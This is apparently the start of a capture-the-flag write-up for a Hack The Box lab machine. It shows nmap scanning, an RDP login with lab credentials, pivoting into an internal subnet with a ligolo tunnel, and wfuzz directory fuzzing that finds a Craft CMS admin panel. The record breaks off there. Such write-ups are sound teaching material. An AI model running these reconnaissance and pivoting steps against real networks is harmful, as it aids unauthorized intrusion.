## Introduction

## Attack summary table
## Reconnaissance
```bash
nmap 10.129.112.32 -n -Pn --min-rate 4000 -oN fast_scan
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server
```

With the provided credentials, i entered to the target via rdp `contractor:Contractor2026!`

Once inside target, i saw the wlan connection, so activated it and opened the browser, it autmatically redirects to `portal.international.htb`

In the website only saw interesting an login panel but no credentials found. so i did ping to the international.htb and it reavealed the IP in the wlan range.  `10.13.37.0/24`

Before continue the recconnaissance i had to do pivoting to the target to be able to scan the interational.htb host. 

---
Step 1: configurate interface and proxy in atacant machine
```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./proxy -selfcert -laddr 0.0.0.0:11601
```

Step 2: upload the agent to the target and start it 
```bash
./agent -connect <kali_ip>:11601 -ignore-cert
```

Step 3: create routes and start ligolo
```bash
# After agent connects, add route to internal network
sudo ip route add 10.13.37.0/24 dev ligolo

# In ligolo console:
session          # select agent session
start            # start tunnel
```

if automatically the OS creates the static route 'via tun0', we had to eliminate that route before create the route to ligolo.

---

Once pivoting tunnel was established, on my kali visited the web and after that did directory web fuzzing, and found `/admin` directory with a login panel, and noticed that is a craftCMS behind the website.

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://portal.international.htb/FUZZ --hc 404 -R 2

000000259:   302        0 L      0 W        0 Ch        "admin"        
000000291:   301        7 L      12 W       178 Ch      "assets"       
000001225:   302        0 L      0 W        0 Ch        "logout"
```